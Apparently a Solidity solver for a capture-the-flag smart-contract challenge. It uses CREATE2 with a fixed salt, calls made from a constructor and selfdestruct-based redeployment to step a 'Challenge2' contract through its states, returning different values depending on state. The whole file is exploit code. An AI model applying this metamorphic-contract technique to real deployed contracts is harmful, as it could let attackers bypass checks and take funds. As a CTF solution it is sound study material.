pragma solidity 0.7.6;

import "./Setup.sol";
import "hardhat/console.sol";

contract solver is ICalled{

    Challenge2 instance;

    constructor(address inst) payable {
        instance = Challenge2(inst);
        if(instance.state() == Challenge2.State.THREE) {
            instance.third();
        } else {
            instance.first();
        }  
    }

    function sup() external override returns(uint256) {
        if(instance.state() == Challenge2.State.ZERO) {
            return 80085;
        } else {
            return 1337;
        }
    }

    function callSecond() public {
        instance.second();
        selfdestruct(payable(address(0)));
    }

    function callFourth() public {
        instance.fourth();
    }

    receive() external payable { }

}

contract teryanarmenAttacker {

    Challenge2 public instance;
    address public deployed;
    
    constructor(Challenge2 inst) payable {
        instance = inst;
        deploy();
        solver(payable(deployed)).callSecond();
    }

    function solve() public {
        deploy();
        solver(payable(deployed)).callFourth();
    }

    function deploy() internal {
         
        bytes memory code = abi.encodePacked(type(solver).creationCode, abi.encode(address(instance)));
        uint256 salt = 0x7075;
        address addr;
    
        assembly {
            addr := create2(0, add(code, 0x20), mload(code), salt)
            if iszero(extcodesize(addr)) { revert(0, 0) }
        }

        deployed = addr;
    }

    receive() external payable { }

}

